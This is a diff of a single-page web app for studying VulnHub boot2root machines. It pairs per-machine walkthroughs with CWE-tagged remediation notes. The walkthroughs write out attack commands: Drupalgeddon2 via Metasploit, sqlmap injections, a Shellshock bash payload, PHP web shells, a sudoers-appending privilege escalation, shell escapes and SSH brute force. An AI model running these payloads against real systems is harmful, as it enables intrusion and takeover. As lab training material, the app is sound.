+setup:[{t:"Download",d:"Get DC-1 from VulnHub.",c:""},{t:"Import",d:"VirtualBox/VMware.",c:""},{t:"Network",d:"Host-Only or NAT Network.",c:""},{t:"Find IP",d:"Discover.",c:"sudo netdiscover"}],
+walk:[{ph:"🔍 Recon",st:[{t:"Nmap",d:"Full scan.",c:"nmap -sV -sC -p- <ip>"}]},{ph:"📡 Enum",st:[{t:"Drupal Discovery",d:"Drupal 7 on port 80.",c:"droopescan scan drupal -u http://<ip>"},{t:"robots.txt",d:"Check for hidden paths.",c:"curl http://<ip>/robots.txt"}]},{ph:"💥 Exploit",st:[{t:"Drupalgeddon2",d:"CVE-2018-7600 RCE.",c:"msfconsole\nuse exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS <ip>\nexploit"},{t:"Alternative: SQLi",d:"Drupal 7 SQL injection.",c:"searchsploit drupal 7"}]},{ph:"⬆️ Priv Esc",st:[{t:"SUID find",d:"find has SUID bit set.",c:"find / -perm -4000 2>/dev/null\n# find . -exec /bin/sh \\; -quit"}]},{ph:"🏁 Flags",st:[{t:"All 5 Flags",d:"Find flags throughout the system.",c:"find / -name 'flag*' 2>/dev/null"}]}],
+mistakes:[{t:"Unpatched CMS",s:"Critical",cwe:"CWE-1104",w:"Drupal 7 with known RCE (Drupalgeddon2).",r:"Always update CMS to latest version. Enable auto-updates.",f:"drush up drupal\n# Enable automatic security updates"},{t:"SUID on find",s:"Critical",cwe:"CWE-269",w:"find binary has SUID bit allowing root execution.",r:"Never set SUID on unnecessary binaries.",f:"chmod u-s /usr/bin/find"}]},
+
+{id:"dc2",name:"DC-2",series:"DC",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","oscp","privesc"],oscp:true,rating:4.4,comp:8500,size:"650MB",url:"https://www.vulnhub.com/entry/dc-2,311/",desc:"WordPress with custom wordlist generation. Multiple flags to find.",
+setup:[{t:"Setup",d:"Standard VulnHub import. Note: may need to add hostname to /etc/hosts.",c:"echo '<ip> dc-2' >> /etc/hosts"}],
+walk:[{ph:"🔍 Recon",st:[{t:"Nmap",d:"Scan.",c:"nmap -sV -sC <ip>"}]},{ph:"📡 Enum",st:[{t:"WordPress",d:"WPScan for users and plugins.",c:"wpscan --url http://dc-2 -e u"}]},{ph:"💥 Exploit",st:[{t:"Brute Force WP",d:"Generate wordlist with cewl and brute force.",c:"cewl http://dc-2 -w wordlist.txt\nwpscan --url http://dc-2 -U users -P wordlist.txt"}]},{ph:"⬆️ Priv Esc",st:[{t:"rbash Escape",d:"Restricted bash escape.",c:"env\nBASH_CMDS[a]=/bin/sh;a\nexport PATH=/bin:/usr/bin"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Get final flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Weak Passwords",s:"High",cwe:"CWE-521",w:"Users have passwords based on site content.",r:"Enforce strong password policies. Use MFA.",f:"Implement password complexity requirements and 2FA."}]},
+
+{id:"dc3",name:"DC-3",series:"DC",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","oscp","sqli"],oscp:true,rating:4.3,comp:7200,size:"800MB",url:"https://www.vulnhub.com/entry/dc-32,312/",desc:"Joomla CMS with SQL injection. One flag, root only.",
+setup:[{t:"Setup",d:"Standard import.",c:""}],
+walk:[{ph:"🔍 Recon",st:[{t:"Scan",d:"Nmap.",c:"nmap -sV <ip>"}]},{ph:"💥 Exploit",st:[{t:"Joomla SQLi",d:"CVE-2017-8917.",c:"sqlmap -u 'http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' --risk=3 --level=5"}]},{ph:"⬆️ Priv Esc",st:[{t:"Kernel Exploit",d:"Ubuntu 16.04 kernel 4.4.",c:"searchsploit linux kernel 4.4\n# Use overlayfs exploit"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Get flag.",c:"cat /root/the-flag.txt"}]}],
+mistakes:[{t:"Unpatched Joomla",s:"Critical",cwe:"CWE-89",w:"Joomla 3.7.0 with known SQLi.",r:"Update CMS immediately when patches release.",f:"Enable auto-updates for Joomla."}]},
+
+{id:"dc4",name:"DC-4",series:"DC",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","privesc"],oscp:false,rating:4.2,comp:6800,size:"600MB",url:"https://www.vulnhub.com/entry/dc-4,313/",desc:"Custom web app with command injection. Good for beginners.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"🔍 Recon",st:[{t:"Scan",d:"Nmap.",c:"nmap -sV <ip>"}]},{ph:"💥 Exploit",st:[{t:"Command Injection",d:"Login and exploit exec feature.",c:"admin:admin → command injection in dashboard"}]},{ph:"⬆️ Priv Esc",st:[{t:"Backup Script",d:"Writable backup script run by root.",c:"echo '/bin/bash' > /opt/scripts/backup.sh"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Get flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Command Injection",s:"Critical",cwe:"CWE-78",w:"User input passed to system().",r:"Never pass user input to shell commands.",f:"Use subprocess with argument lists."}]},
+
+{id:"dc5",name:"DC-5",series:"DC",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","privesc"],oscp:false,rating:4.0,comp:5500,size:"550MB",url:"https://www.vulnhub.com/entry/dc-5,314/",desc:"LFI and log poisoning. Screen RCE for privesc.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"🔍 Recon",st:[{t:"Scan",d:"Nmap.",c:"nmap -sV <ip>"}]},{ph:"💥 Exploit",st:[{t:"LFI + Log Poisoning",d:"Include nginx access log via LFI.",c:"http://<ip>/thankyou.php?file=../../../../var/log/nginx/access.log"}]},{ph:"⬆️ Priv Esc",st:[{t:"Screen 4.5.0",d:"SUID screen exploit.",c:"searchsploit screen 4.5.0"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"LFI Vulnerability",s:"Critical",cwe:"CWE-98",w:"Unsanitized file parameter.",r:"Whitelist allowed files.",f:"Never use user input in file paths."}]},
+
+{id:"dc6",name:"DC-6",series:"DC",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","oscp"],oscp:true,rating:4.1,comp:5200,size:"700MB",url:"https://www.vulnhub.com/entry/dc-6,315/",desc:"WordPress with plugin vulnerability. Nmap privesc.",
+setup:[{t:"Setup",d:"Add to /etc/hosts: <ip> wordy",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"WP Plugin RCE",d:"Plainview Activity Monitor RCE.",c:"searchsploit plainview activity monitor"}]},{ph:"⬆️ Priv Esc",st:[{t:"Sudo Nmap",d:"User can run nmap as root.",c:"sudo nmap --interactive\n!sh"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Sudo Misconfiguration",s:"Critical",cwe:"CWE-269",w:"User allowed to run nmap as root via sudo.",r:"Never grant sudo to dangerous binaries.",f:"Review /etc/sudoers carefully."}]},
+
+{id:"dc7",name:"DC-7",series:"DC",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","privesc"],oscp:false,rating:4.0,comp:4800,size:"750MB",url:"https://www.vulnhub.com/entry/dc-7,356/",desc:"Social engineering and PHP reverse shell.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"GitHub Recon",d:"Find source code on GitHub.",c:"Search for DC-7 related repos"},{t:"PHP Shell",d:"Upload reverse shell via Drupal.",c:""}]},{ph:"⬆️ Priv Esc",st:[{t:"Cron Job",d:"Writable script run by root cron.",c:"cat /etc/crontab"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Exposed Source Code",s:"High",cwe:"CWE-200",w:"Source code with credentials on public GitHub.",r:"Never commit secrets to public repos.",f:"Use .gitignore and secret scanning."}]},
+
+{id:"dc8",name:"DC-8",series:"DC",diff:"Medium",ds:6,os:"Linux",tags:["web","boot2root","oscp","sqli"],oscp:true,rating:4.1,comp:4500,size:"800MB",url:"https://www.vulnhub.com/entry/dc-8,367/",desc:"Drupal with SQLi and Exim privesc.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"SQLi",d:"Extract admin hash.",c:"sqlmap -u 'http://<ip>/?nid=1'"}]},{ph:"⬆️ Priv Esc",st:[{t:"Exim 4",d:"Exim 4.89 privesc.",c:"searchsploit exim 4.89"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"SQL Injection",s:"Critical",cwe:"CWE-89",w:"Unparameterized queries in Drupal module.",r:"Use Drupal's database abstraction layer.",f:"db_query('SELECT * FROM {node} WHERE nid = :nid', [':nid' => $nid]);"}]},
+
+{id:"dc9",name:"DC-9",series:"DC",diff:"Medium",ds:6,os:"Linux",tags:["web","boot2root","oscp","sqli"],oscp:true,rating:4.3,comp:4200,size:"750MB",url:"https://www.vulnhub.com/entry/dc-9,412/",desc:"SQL injection with port knocking and LFI.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"SQLi + Port Knocking",d:"SQLi to get credentials, knock ports to open SSH.",c:"knock <ip> 7469 8475 9842"}]},{ph:"⬆️ Priv Esc",st:[{t:"Wildcard Injection",d:"Sudo script with wildcard.",c:"sudo /opt/devstuff/dist/test/test"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/theflag.txt"}]}],
+mistakes:[{t:"Port Knocking as Only Defense",s:"Medium",cwe:"CWE-284",w:"Relying on port knocking instead of proper auth.",r:"Use defense in depth. Port knocking is not authentication.",f:"Use SSH keys, fail2ban, and proper firewall rules."}]},
+
+{id:"mr1",name:"Mr-Robot: 1",series:"Mr-Robot",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","privesc"],oscp:false,rating:4.7,comp:13000,size:"800MB",url:"https://www.vulnhub.com/entry/mr-robot-1,151/",desc:"Based on the TV show. WordPress site with 3 keys to find. Very popular.",
+setup:[{t:"Setup",d:"Standard VulnHub import.",c:""}],
+walk:[{ph:"🔍 Recon",st:[{t:"Scan",d:"Nmap.",c:"nmap -sV <ip>"}]},{ph:"📡 Enum",st:[{t:"robots.txt",d:"Find hidden files.",c:"curl http://<ip>/robots.txt\n# Found: fsocity.dic, key-1-of-3.txt"},{t:"WordPress",d:"WPScan users.",c:"wpscan --url http://<ip> -e u"}]},{ph:"💥 Exploit",st:[{t:"WP Brute Force",d:"Use fsocity.dic as wordlist.",c:"wpscan --url http://<ip> -U elliot -P fsocity.dic"},{t:"Reverse Shell",d:"Upload PHP shell via WP theme editor.",c:"<?php system($_GET['cmd']); ?>"}]},{ph:"⬆️ Priv Esc",st:[{t:"SUID nmap",d:"Nmap has SUID bit.",c:"nmap --interactive\n!sh"}]},{ph:"🏁 Keys",st:[{t:"All 3 Keys",d:"Find key-1, key-2, key-3.",c:"find / -name 'key*' 2>/dev/null"}]}],
+mistakes:[{t:"Exposed Wordlist",s:"High",cwe:"CWE-200",w:"Dictionary file exposed in robots.txt.",r:"Never expose sensitive files via robots.txt.",f:"Use proper access controls, not robots.txt."},{t:"SUID Nmap",s:"Critical",cwe:"CWE-269",w:"Nmap binary has SUID root.",r:"Remove SUID from unnecessary binaries.",f:"chmod u-s /usr/local/bin/nmap"}]},
+
+{id:"vulnos2",name:"VulnOS: 2",series:"VulnOS",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","oscp","sqli"],oscp:true,rating:4.3,comp:7800,size:"900MB",url:"https://www.vulnhub.com/entry/vulnos-2,147/",desc:"SQL injection and LFI. Kernel privesc. OSCP-like.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"SQLi",d:"Jabc app SQL injection.",c:"sqlmap -u 'http://<ip>/jabc/?q=node/1' --dbs"}]},{ph:"⬆️ Priv Esc",st:[{t:"Kernel",d:"Ubuntu 14.04 kernel exploit.",c:"searchsploit linux kernel 3.13\n# Use overlayfs (CVE-2015-1328)"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"SQL Injection",s:"Critical",cwe:"CWE-89",w:"Unsanitized input in web app.",r:"Use parameterized queries.",f:"Always use prepared statements."}]},
+
+{id:"sickos1",name:"SickOs: 1.1",series:"SickOS",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","oscp"],oscp:true,rating:4.0,comp:5600,size:"750MB",url:"https://www.vulnhub.com/entry/sickos-11,132/",desc:"Squid proxy, Shellshock, and cron privesc.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"Shellshock via Proxy",d:"Exploit through Squid proxy.",c:"curl -x http://<ip>:3128 -H 'User-Agent: () { :;}; /bin/bash -i' http://localhost/cgi-bin/status"}]},{ph:"⬆️ Priv Esc",st:[{t:"Cron Job",d:"Writable script in cron.",c:"cat /etc/crontab"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Shellshock (CVE-2014-6271)",s:"Critical",cwe:"CWE-78",w:"Unpatched Bash vulnerable to Shellshock.",r:"Patch Bash immediately.",f:"apt-get update && apt-get install bash"}]},
+
+{id:"sickos2",name:"SickOs: 1.2",series:"SickOS",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","oscp"],oscp:true,rating:4.1,comp:5100,size:"700MB",url:"https://www.vulnhub.com/entry/sickos-12,133/",desc:"PUT method upload and chkrootkit privesc.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"HTTP PUT Upload",d:"Upload shell via PUT method.",c:"curl -X PUT http://<ip>/shell.php -d '<?php system($_GET[\"c\"]); ?>'"}]},{ph:"⬆️ Priv Esc",st:[{t:"chkrootkit",d:"Vulnerable chkrootkit cron.",c:"echo 'chmod +w /etc/sudoers && echo \"www-data ALL=NOPASSWD: ALL\" >> /etc/sudoers' > /tmp/update"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"HTTP PUT Enabled",s:"Critical",cwe:"CWE-434",w:"Web server allows file upload via PUT.",r:"Disable PUT/DELETE methods.",f:"<LimitExcept GET POST HEAD>\nDeny from all\n</LimitExcept>"}]},
+
+{id:"stapler",name:"Stapler: 1",series:"Standalone",diff:"Medium",ds:5,os:"Linux",tags:["web","boot2root","oscp","privesc"],oscp:true,rating:4.4,comp:6500,size:"1.2GB",url:"https://www.vulnhub.com/entry/stapler-1,150/",desc:"Multiple attack vectors. FTP, SSH, WordPress, MySQL. Great OSCP practice.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"🔍 Recon",st:[{t:"Full Scan",d:"Many ports open.",c:"nmap -sV -sC -p- <ip>"}]},{ph:"📡 Enum",st:[{t:"FTP",d:"Anonymous login.",c:"ftp <ip>\n# anonymous:anonymous"},{t:"WordPress",d:"WPScan.",c:"wpscan --url http://<ip>/wordpress"}]},{ph:"💥 Exploit",st:[{t:"Multiple Paths",d:"FTP creds, WP brute, SSH.",c:"hydra -l user -P rockyou.txt ssh://<ip>"}]},{ph:"⬆️ Priv Esc",st:[{t:"Sudo",d:"Check sudo -l.",c:"sudo -l"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Anonymous FTP",s:"High",cwe:"CWE-284",w:"FTP allows anonymous login with sensitive files.",r:"Disable anonymous FTP access.",f:"anonymous_enable=NO in vsftpd.conf"}]},
+
+{id:"fristi",name:"FristiLeaks: 1.3",series:"Standalone",diff:"Medium",ds:6,os:"Linux",tags:["web","boot2root","oscp","privesc"],oscp:true,rating:4.5,comp:7000,size:"700MB",url:"https://www.vulnhub.com/entry/fristileaks-13,133/",desc:"Image upload bypass and SUID privesc. Classic OSCP-style.",
+setup:[{t:"Setup",d:"Set MAC address to 08:00:27:A5:A6:76 or use DHCP.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"File Upload Bypass",d:"Upload PHP shell with image header.",c:"GIF89a\n<?php system($_GET['c']); ?>"}]},{ph:"⬆️ Priv Esc",st:[{t:"SUID Binary",d:"Custom SUID binary.",c:"find / -perm -4000 2>/dev/null"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Insecure File Upload",s:"Critical",cwe:"CWE-434",w:"Only checks file extension, not content.",r:"Validate MIME type, content, and use random filenames.",f:"Use finfo_file() to check actual file type."}]},
+
+{id:"brainpan",name:"Brainpan: 1",series:"Standalone",diff:"Hard",ds:7,os:"Linux",tags:["boot2root","oscp","bof","privesc"],oscp:true,rating:4.6,comp:5800,size:"500MB",url:"https://www.vulnhub.com/entry/brainpan-1,51/",desc:"Buffer overflow challenge. Classic BOF + Ananasi privesc.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"Buffer Overflow",d:"BOF on port 9999.",c:"# 1. Fuzz to find crash point\n# 2. Find offset with pattern_create\n# 3. Find JMP ESP\n# 4. Generate shellcode\n# 5. Send exploit\npython exploit.py"}]},{ph:"⬆️ Priv Esc",st:[{t:"Sudo Ananasi",d:"Custom binary with sudo.",c:"sudo /home/anansi/bin/anansi_util"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Buffer Overflow",s:"Critical",cwe:"CWE-120",w:"No bounds checking on input buffer.",r:"Use safe functions. Enable ASLR, DEP, stack canaries.",f:"Use strncpy() instead of strcpy(). Compile with -fstack-protector."}]},
+
+{id:"bulldog",name:"Bulldog: 1",series:"Standalone",diff:"Easy",ds:3,os:"Linux",tags:["web","boot2root","privesc"],oscp:false,rating:4.1,comp:5400,size:"800MB",url:"https://www.vulnhub.com/entry/bulldog-1,211/",desc:"Django web app with hash cracking and custom privesc.",
+setup:[{t:"Setup",d:"Standard.",c:""}],
+walk:[{ph:"💥 Exploit",st:[{t:"Hash Cracking",d:"Find hashes in page source, crack them.",c:"john hashes.txt --wordlist=rockyou.txt"}]},{ph:"⬆️ Priv Esc",st:[{t:"Custom Script",d:"Writable Python script run as root.",c:"echo 'import os; os.system(\"/bin/bash\")' > /custom/scripts/manage.py"}]},{ph:"🏁 Flag",st:[{t:"Root",d:"Flag.",c:"cat /root/flag.txt"}]}],
+mistakes:[{t:"Exposed Hashes",s:"High",
+cwe:"CWE-200",w:"Password hashes left in the page source.",r:"Never ship hashes or secrets to the client.",f:"Remove debug output; keep credentials server-side only."}]}
+];
+
+// ===== APP =====
+const $=id=>document.getElementById(id);
+const esc=s=>String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+let S={done:{},learned:{},days:[]};
+try{const r=localStorage.getItem('cm-progress');if(r)S=Object.assign(S,JSON.parse(r))}catch(e){}
+const save=()=>{try{localStorage.setItem('cm-progress',JSON.stringify(S))}catch(e){}};
+const dk=d=>d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');
+const touch=()=>{const k=dk(new Date());if(!S.days.includes(k))S.days.push(k)};
+function streak(){const d=new Date();let n=0;if(!S.days.includes(dk(d)))d.setDate(d.getDate()-1);while(S.days.includes(dk(d))){n++;d.setDate(d.getDate()-1)}return n}
+const byId=id=>M.find(m=>m.id===id);
+const DB={Beginner:'b-easy',Easy:'b-easy',Medium:'b-med',Hard:'b-hard',Insane:'b-insane'};
+const SV={Critical:'sev-c',High:'sev-h',Medium:'sev-m'};
+const badges=m=>`<span class="badge ${DB[m.diff]||'b-med'}">${esc(m.diff)}</span><span class="badge ${m.os==='Windows'?'b-win':'b-linux'}">${esc(m.os)}</span><span class="badge" style="background:var(--bg5);color:var(--t2)">⭐ ${m.rating}</span>`;
+const code=c=>c?`<pre><code>${esc(c)}</code></pre>`:'';
+
+// ----- navigation -----
+const PAGES=['home','vulnhub','detail','paths','mistakes','dash'];
+function go(p){
+  const nav=p==='detail'?'vulnhub':p;
+  PAGES.forEach(x=>{$('p-'+x).classList.toggle('active',x===p);const n=$('n-'+x);if(n)n.classList.toggle('active',x===nav)});
+  if(p==='vulnhub')doFilter();if(p==='paths')renderPaths();if(p==='mistakes')renderMist();if(p==='dash')renderDash();
+  window.scrollTo(0,0);
+}
+
+// ----- machine browser -----
+const F={tags:new Set()};
+function tagCloud(){const t=[...new Set(M.flatMap(m=>m.tags))].sort();$('tag-cloud').innerHTML=t.map(x=>`<span class="tag-b${F.tags.has(x)?' on':''}" onclick="togTag('${x}')">${x}</span>`).join('')}
+function togTag(t){F.tags.has(t)?F.tags.delete(t):F.tags.add(t);tagCloud();doFilter()}
+function resetF(){$('f-search').value='';['f-diff','f-os','f-series'].forEach(i=>$(i).value='all');$('f-sort').value='pop';F.tags.clear();tagCloud();doFilter()}
+const card=m=>`<div class="m-card" onclick="openM('${m.id}')"><div class="ct"><h3>${esc(m.name)}</h3>${m.oscp?'<span class="oscp-b">OSCP-like</span>':''}</div><div class="cm">${badges(m)}</div><div class="cd">${esc(m.desc)}</div><div class="ctags">${m.tags.map(t=>`<span>${t}</span>`).join('')}</div><div class="cf"><span>${S.done[m.id]?'✅ Completed':'👥 '+m.comp.toLocaleString()+' completed'}</span><span>💾 ${esc(m.size)}</span></div></div>`;
+function doFilter(){
+  const q=$('f-search').value.trim().toLowerCase(),d=$('f-diff').value,o=$('f-os').value,s=$('f-series').value,so=$('f-sort').value;
+  const r=M.filter(m=>(d==='all'||m.diff===d)&&(o==='all'||m.os===o)&&(s==='all'||m.series===s)&&[...F.tags].every(t=>m.tags.includes(t))&&(!q||(m.name+' '+m.desc+' '+m.series+' '+m.tags.join(' ')).toLowerCase().includes(q)));
+  r.sort(so==='name'?(a,b)=>a.name.localeCompare(b.name):so==='easy'?(a,b)=>a.ds-b.ds:so==='hard'?(a,b)=>b.ds-a.ds:(a,b)=>b.comp-a.comp);
+  $('m-cnt').textContent=r.length+' machine'+(r.length===1?'':'s');
+  $('m-grid').innerHTML=r.length?r.map(card).join(''):'<p style="color:var(--t2)">No machines match these filters. Try resetting them.</p>';
+}
+
+// ----- machine detail -----
+function openM(id){
+  const m=byId(id);if(!m)return;
+  const mist=m.mistakes.map((x,i)=>{const k=id+':'+i;return `<div class="mist-c"><div class="mist-h"><h3>${esc(x.t)}</h3><span class="sev ${SV[x.s]||'sev-m'}">${esc(x.s)}</span><span style="color:var(--purple);font-size:.8em;font-weight:600">${esc(x.cwe)}</span></div><div class="comp"><div class="wrong"><h4>❌ What went wrong</h4><p style="font-size:.9em;color:var(--t2)">${esc(x.w)}</p></div><div class="right"><h4>✅ How to fix it</h4><p style="font-size:.9em;color:var(--t2)">${esc(x.r)}</p>${code(x.f)}</div></div><button class="btn ${S.learned[k]?'btn-p':'btn-s'}" onclick="learn('${k}',this)">${S.learned[k]?'✅ Learned':'☐ Mark as learned'}</button></div>`}).join('');
+  const setup=m.setup.map((s,i)=>`<div class="s-step" data-n="${i+1}"><h3>${esc(s.t)}</h3><p>${esc(s.d)}</p>${code(s.c)}</div>`).join('');
+  const walk=m.walk.map((p,i)=>`<div class="w-phase"><div class="w-head" onclick="this.nextElementSibling.classList.toggle('open')"><strong>${esc(p.ph)}</strong><span style="color:var(--t3);font-size:.82em">${p.st.length} step${p.st.length>1?'s':''} ▾</span></div><div class="w-body${i===0?' open':''}">${p.st.map(s=>`<div class="w-item"><h4>${esc(s.t)}</h4><p>${esc(s.d)}</p>${code(s.c)}</div>`).join('')}</div></div>`).join('');
+  $('detail-out').innerHTML=`<div class="d-hero"><div class="bread"><a onclick="go('vulnhub')">VulnHub</a> / ${esc(m.series)} / ${esc(m.name)}</div><h1>${esc(m.name)}</h1><div class="d-meta">${badges(m)}${m.oscp?'<span class="oscp-b">OSCP-like</span>':''}</div><p style="color:var(--t2);margin-bottom:16px">${esc(m.desc)}</p><div class="d-acts"><a class="btn btn-p" href="${esc(m.url)}" target="_blank" rel="noopener">⬇️ Get it on VulnHub</a><button class="btn btn-s" id="done-btn" onclick="toggleDone('${id}')"></button></div></div>
+<div class="tabs"><button class="tab-b on" onclick="tab(this,'t-setup')">⚙️ Setup</button><button class="tab-b" onclick="tab(this,'t-walk')">🗺️ Walkthrough</button><button class="tab-b" onclick="tab(this,'t-mist')">❌ Mistakes (${m.mistakes.length})</button></div>
+<div class="tab-c on" id="t-setup">${setup}<div class="warn">⚠️ Run vulnerable VMs on an isolated host-only network, never bridged to a real LAN.</div></div>
+<div class="tab-c" id="t-walk">${walk}</div>
+<div class="tab-c" id="t-mist">${mist}</div>`;
+  paintDone(id);go('detail');
+}
+function tab(b,id){b.parentNode.querySelectorAll('.tab-b').forEach(x=>x.classList.toggle('on',x===b));document.querySelectorAll('#detail-out .tab-c').forEach(x=>x.classList.toggle('on',x.id===id))}
+function paintDone(id){const b=$('done-btn');b.className='btn '+(S.done[id]?'btn-p':'btn-s');b.textContent=S.done[id]?'✅ Completed (click to undo)':'☐ Mark as complete'}
+function toggleDone(id){S.done[id]=!S.done[id];if(S.done[id])touch();save();paintDone(id)}
+function learn(k,b){S.learned[k]=!S.learned[k];if(S.learned[k])touch();save();b.className='btn '+(S.learned[k]?'btn-p':'btn-s');b.textContent=S.learned[k]?'✅ Learned':'☐ Mark as learned'}
+
+// ----- learning paths -----
+const PATHS=[
+  {t:'🌱 Absolute Beginner',d:'Gentle first boxes covering outdated software, SQL injection and basic privilege escalation.',f:m=>m.ds<=3},
+  {t:'🎓 OSCP Prep',d:'OSCP-style machines that train enumeration, exploitation and getting root.',f:m=>m.oscp},
+  {t:'🌐 Web Application Security',d:'Break CMSs and custom web apps with LFI, upload bypasses and injection.',f:m=>m.tags.includes('web')},
+  {t:'💉 SQL Injection',d:'From login bypass to blind SQLi and hash extraction.',f:m=>m.tags.includes('sqli')},
+  {t:'⬆️ Privilege Escalation',d:'SUID, sudo, cron and kernel routes from foothold to root.',f:m=>m.tags.includes('privesc')}
+];
+function renderPaths(){
+  $('paths-g').innerHTML=PATHS.map((p,i)=>{
+    const ms=M.filter(p.f).sort((a,b)=>a.ds-b.ds),n=ms.filter(m=>S.done[m.id]).length,next=ms.find(m=>!S.done[m.id])||ms[0];
+    return `<div class="path-c p${i%4+1}"><h3>${p.t}</h3><p>${p.d}</p><div class="path-m"><span>${ms.length} machines</span><span>${n}/${ms.length} done</span></div><div class="pbar"><div class="pfill" style="width:${ms.length?n/ms.length*100:0}%"></div></div><ol style="margin:12px 0 14px 18px;color:var(--t2);font-size:.88em">${ms.map(m=>`<li><a onclick="openM('${m.id}')" style="cursor:pointer">${esc(m.name)}</a>${S.done[m.id]?' ✅':''}</li>`).join('')}</ol><button class="btn btn-p" onclick="openM('${next.id}')">${n?'Continue path':'Start path'}</button></div>`}).join('');
+}
+
+// ----- mistakes library -----
+function renderMist(){
+  const g={};
+  M.forEach(m=>m.mistakes.forEach(x=>{const e=g[x.t]=g[x.t]||{t:x.t,s:x.s,cwe:x.cwe,r:x.r,ms:[]};e.ms.push(m);if(x.s==='Critical')e.s='Critical'}));
+  $('ml-g').innerHTML=Object.values(g).sort((a,b)=>b.ms.length-a.ms.length).map(e=>`<div class="ml-c"><div class="mist-h"><h3 style="margin:0">${esc(e.t)}</h3><span class="sev ${SV[e.s]||'sev-m'}">${esc(e.s)}</span></div><p>${esc(e.r)}</p><div class="cwe">${esc(e.cwe)} · seen in ${e.ms.length} machine${e.ms.length>1?'s':''}</div><div style="margin-top:8px;font-size:.82em">${e.ms.slice(0,4).map(m=>`<a onclick="openM('${m.id}')" style="cursor:pointer;margin-right:10px">${esc(m.name)}</a>`).join('')}</div></div>`).join('');
+}
+
+// ----- dashboard -----
+function renderDash(){
+  const done=M.filter(m=>S.done[m.id]),ln=Object.values(S.learned).filter(Boolean).length;
+  $('d-comp').textContent=done.length;
+  $('d-pts').textContent=done.reduce((a,m)=>a+m.ds*10,0)+ln*5;
+  $('d-str').textContent=streak();$('d-mis').textContent=ln;
+  $('d-pbar').style.width=(done.length/M.length*100)+'%';
+  $('d-ptxt').textContent=done.length+' / '+M.length+' machines in this library';
+  const tags=[...new Set(M.flatMap(m=>m.tags))].sort();
+  $('d-skills').innerHTML=tags.map(t=>{const all=M.filter(m=>m.tags.includes(t)),d=all.filter(m=>S.done[m.id]).length;return `<div><div style="display:flex;justify-content:space-between;font-size:.88em"><span>${t}</span><span style="color:var(--t3)">${d}/${all.length}</span></div><div class="pbar"><div class="pfill" style="width:${d/all.length*100}%"></div></div></div>`}).join('');
+}
+
+// ----- init -----
+document.addEventListener('click',e=>{const a=e.target.closest&&e.target.closest('a[href="#"]');if(a)e.preventDefault()});
+tagCloud();doFilter();
+</script>
+</body>
+</html>
